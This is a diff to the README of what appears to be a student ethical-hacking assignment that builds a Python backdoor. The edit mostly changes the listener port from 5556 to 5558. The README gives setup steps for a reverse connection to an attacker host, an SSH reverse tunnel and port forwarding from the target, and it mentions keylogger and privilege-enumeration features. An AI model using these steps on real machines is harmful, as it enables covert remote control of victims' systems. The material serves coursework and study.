@@ -1,4 +1,4 @@
-# Python Backdoor - DES484 Assignment
+# Team9 - Python Backdoor - DES484 Assignment
 
 **⚠️ EDUCATIONAL PURPOSE ONLY - ETHICAL HACKING CLASS PROJECT**
 
@@ -220,7 +220,7 @@ Attacker_Machine/
 
    ```python
    ATTACKER_HOST = '192.168.1.12'  # Your attacker IP
-   ATTACKER_PORT = 5556            # Your listener port
+   ATTACKER_PORT = 5558            # Your listener port
    ```
 
 4. **Run the backdoor:**
@@ -270,7 +270,7 @@ python3 backdoor.py
    Output:
 
    ```
-   [+] Listening on 0.0.0.0:5556
+   [+] Listening on 0.0.0.0:5558
    [*] Waiting for incoming connections...
    ```
 
@@ -312,7 +312,7 @@ cd /tmp
 quit
 ```
 
-### Advanced Features
+### Testing Features
 
 #### Keylogger
 
@@ -467,11 +467,11 @@ net_check_internet
 
 ```bash
 # On attacker machine, check firewall:
-sudo ufw allow 5556/tcp          # Linux
-sudo firewall-cmd --add-port=5556/tcp  # CentOS/RHEL
+sudo ufw allow 5558/tcp          # Linux
+sudo firewall-cmd --add-port=5558/tcp  # CentOS/RHEL
 
 # Verify listener is running:
-netstat -an | grep 5556
+netstat -an | grep 5558
 ```
 
 **Problem:** Wrong IP address
@@ -531,7 +531,7 @@ priv_enum                         # Find escalation vectors
 ```python
 # In backdoor.py:
 ATTACKER_HOST = '192.168.0.107'   # Attacker's local IP
-ATTACKER_PORT = 5556
+ATTACKER_PORT = 5558
 ```
 
 ### Different Networks (WAN/Internet)
@@ -540,7 +540,7 @@ ATTACKER_PORT = 5556
 
 ```bash
 # On attacker's router:
-# Forward external_port -> attacker_ip:5556
+# Forward external_port -> attacker_ip:5558
 
 # In backdoor.py:
 ATTACKER_HOST = 'attacker_public_ip'
@@ -551,11 +551,11 @@ ATTACKER_PORT = external_port
 
 ```bash
 # On target:
-ssh -R 5556:localhost:5556 user@attacker_public_ip
+ssh -R 5558:localhost:5558 user@attacker_public_ip
 
 # In backdoor.py:
 ATTACKER_HOST = 'localhost'
-ATTACKER_PORT = 5556
+ATTACKER_PORT = 5558
 ```
 
 **Method 3: VPN**
